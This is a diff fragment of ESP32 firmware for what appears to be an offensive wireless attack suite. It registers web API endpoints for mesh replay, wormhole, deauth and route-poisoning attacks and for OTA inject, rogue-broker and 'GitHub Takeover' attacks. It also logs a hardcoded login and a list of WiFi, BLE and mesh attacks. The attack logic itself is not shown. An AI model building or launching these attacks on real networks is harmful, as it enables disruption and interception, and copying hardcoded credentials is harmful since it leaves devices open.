+        httpd_register_uri_handler(server, &mesh_eaves_stop_uri);
+
+        httpd_uri_t mesh_replay_start_uri = {.uri = "/api/mesh/replay/start", .method = HTTP_POST, .handler = mesh_replay_start_handler};
+        httpd_register_uri_handler(server, &mesh_replay_start_uri);
+        httpd_uri_t mesh_replay_status_uri = {.uri = "/api/mesh/replay/status", .method = HTTP_GET, .handler = mesh_replay_status_handler};
+        httpd_register_uri_handler(server, &mesh_replay_status_uri);
+        httpd_uri_t mesh_replay_stop_uri = {.uri = "/api/mesh/replay/stop", .method = HTTP_POST, .handler = mesh_replay_stop_handler};
+        httpd_register_uri_handler(server, &mesh_replay_stop_uri);
+
+        httpd_uri_t mesh_wormhole_start_uri = {.uri = "/api/mesh/wormhole/start", .method = HTTP_POST, .handler = mesh_wormhole_start_handler};
+        httpd_register_uri_handler(server, &mesh_wormhole_start_uri);
+        httpd_uri_t mesh_wormhole_status_uri = {.uri = "/api/mesh/wormhole/status", .method = HTTP_GET, .handler = mesh_wormhole_status_handler};
+        httpd_register_uri_handler(server, &mesh_wormhole_status_uri);
+        httpd_uri_t mesh_wormhole_stop_uri = {.uri = "/api/mesh/wormhole/stop", .method = HTTP_POST, .handler = mesh_wormhole_stop_handler};
+        httpd_register_uri_handler(server, &mesh_wormhole_stop_uri);
+
+        httpd_uri_t mesh_l2_deauth_start_uri = {.uri = "/api/mesh/l2-deauth/start", .method = HTTP_POST, .handler = mesh_l2_deauth_start_handler};
+        httpd_register_uri_handler(server, &mesh_l2_deauth_start_uri);
+        httpd_uri_t mesh_l2_deauth_status_uri = {.uri = "/api/mesh/l2-deauth/status", .method = HTTP_GET, .handler = mesh_l2_deauth_status_handler};
+        httpd_register_uri_handler(server, &mesh_l2_deauth_status_uri);
+        httpd_uri_t mesh_l2_deauth_stop_uri = {.uri = "/api/mesh/l2-deauth/stop", .method = HTTP_POST, .handler = mesh_l2_deauth_stop_handler};
+        httpd_register_uri_handler(server, &mesh_l2_deauth_stop_uri);
+
+        httpd_uri_t mesh_route_poison_start_uri = {.uri = "/api/mesh/route-poison/start", .method = HTTP_POST, .handler = mesh_route_poison_start_handler};
+        httpd_register_uri_handler(server, &mesh_route_poison_start_uri);
+        httpd_uri_t mesh_route_poison_status_uri = {.uri = "/api/mesh/route-poison/status", .method = HTTP_GET, .handler = mesh_route_poison_status_handler};
+        httpd_register_uri_handler(server, &mesh_route_poison_status_uri);
+        httpd_uri_t mesh_route_poison_stop_uri = {.uri = "/api/mesh/route-poison/stop", .method = HTTP_POST, .handler = mesh_route_poison_stop_handler};
+        httpd_register_uri_handler(server, &mesh_route_poison_stop_uri);
+
+        /* OTA Attack API (per-module + legacy /api/ota/start dispatcher) */
+        httpd_uri_t ota_sniff_start_uri = { .uri = "/api/ota/sniff/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_sniff_start_uri);
+        httpd_uri_t ota_sniff_stop_uri = { .uri = "/api/ota/sniff/stop", .method = HTTP_POST, .handler = ota_stop_handler };
+        httpd_register_uri_handler(server, &ota_sniff_stop_uri);
+        httpd_uri_t ota_sniff_status_uri = { .uri = "/api/ota/sniff/status", .method = HTTP_GET, .handler = ota_status_handler };
+        httpd_register_uri_handler(server, &ota_sniff_status_uri);
+        httpd_uri_t ota_inject_start_uri = { .uri = "/api/ota/inject/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_inject_start_uri);
+        httpd_uri_t ota_fetch_start_uri = { .uri = "/api/ota/fetch/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_fetch_start_uri);
+        httpd_uri_t ota_poll_start_uri = { .uri = "/api/ota/poll/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_poll_start_uri);
+        httpd_uri_t ota_prov_start_uri = { .uri = "/api/ota/prov/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_prov_start_uri);
+        httpd_uri_t ota_rb_start_uri = { .uri = "/api/ota/rogue-broker/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_rb_start_uri);
+        httpd_uri_t ota_fw_start_uri = { .uri = "/api/ota/firmware/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_fw_start_uri);
+        httpd_uri_t ota_gh_start_uri = { .uri = "/api/ota/github/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_gh_start_uri);
+
         httpd_uri_t ota_start_uri = { .uri = "/api/ota/start", .method = HTTP_POST, .handler = ota_start_handler };
         httpd_register_uri_handler(server, &ota_start_uri);
         httpd_uri_t ota_stop_uri = { .uri = "/api/ota/stop", .method = HTTP_POST, .handler = ota_stop_handler };
@@ -2806,16 +4649,18 @@ void start_web_server(void) {
         httpd_register_uri_handler(server, &ota_fw_clear_uri);
         
         ESP_LOGI(TAG, "==========================================");
-        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v7.0");
+        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v7.1");
         ESP_LOGI(TAG, "Web server started! Open http://192.168.4.1");
         ESP_LOGI(TAG, "Username: omega | Password: solutions123");
         ESP_LOGI(TAG, "WiFi: Deauth, Deauth Detect, Beacon, DoS, Handshake, PMKID, Probe, EvilTwin");
         ESP_LOGI(TAG, "OTA: Sniff, Client, Inject, Fetch, Poll Sniff, GitHub Takeover, Provision Sniff, Rogue Broker, Firmware Analyze");
         ESP_LOGI(TAG, "BLE: Spam, Scan, Spoof, Clone, Connect, L2CAP, GATT, Deauth, Passkey, Takeover");
+        ESP_LOGI(TAG, "MESH: Scan, Sniff, Node Spoof, Packet Inject, MITM, DoS");
         ESP_LOGI(TAG, "==========================================");
     } else {
         ESP_LOGE(TAG, "FAILED to start web server! Free heap: %u bytes. "
-                  "Reduce buffer sizes in ota_attack.h or webserver stack_size.",
+                  "Start web server before BLE init (see main.c) or reduce "
+                  "CONFIG_ESP_MAIN_TASK_STACK_SIZE / WiFi buffers in sdkconfig.",
                   (unsigned)esp_get_free_heap_size());
     }
 }
